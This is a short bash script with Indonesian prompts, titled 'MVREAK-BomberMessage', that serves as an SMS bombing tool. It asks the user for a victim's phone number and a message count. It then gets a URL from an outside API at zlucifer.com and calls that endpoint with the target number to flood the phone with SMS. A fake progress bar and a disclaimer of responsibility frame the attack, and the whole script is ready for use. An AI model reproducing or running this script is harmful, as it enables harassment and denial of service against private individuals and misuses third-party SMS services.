#!/bin/bash
echo "Welcome to MVREAK-BomberMessage"
echo "Kami tidak bertanggung jawab atas apapun,"
echo Input nama kamu? #tulisan keluar
read nick #membaca yang ditulis
sleep 0.03
echo "TOOLS BY KURAPS"
sleep 0.03
echo "MY GITHUB : "
sleep 0.03
echo " https://github.com/kuraps"
sleep 0.03
echo "YOUTUBE :"
sleep 0.03
echo " KURAPS DEV"
echo Selamat datang $nick ""
get_url=$(curl -s http://zlucifer.com/api/sms.php)
cek='curl -s '$get_url # check status
response=`curl -s -o /dev/null -w "%{http_code}" $cek`
if [[ $response = *sleeping* ]]; then
    echo
    echo "Server sedang tidak tersedia atau offline"
else
    echo
    echo "Input nomor handphone target"
    echo contoh 08123456XNXX
    read target # input no telp
    echo
    echo "Jumlah SMS yang akan dikirim (Note : SMS mungkin bisa lebih dari inputan)"
    read paket
    echo
    echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
    echo y/n?
    read confirm
    echo
    if [ $confirm = "y" ]; then
        echo Melakukan spam SMS ke nomor $target
        i=0
        max=100
        while [ $i -le $max ]; do
        echo -ne "\nSpamming percentage : $i% "
        sleep 0.03
        if [ $i -eq 100 ]; then
            echo -ne " [complete!]\n"
            echo "JANGAN TUTUP SAMPAI ADA PEMBERITAHUAN SELESAI"
            target_do=$get_url'/sms.php?nomor='$target'&paket='$paket
            CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
            echo " SELESAI "
            echo
            echo "======================================="
            fi
            let i++
            done
    else
        echo "ERROR"
    fi
fi
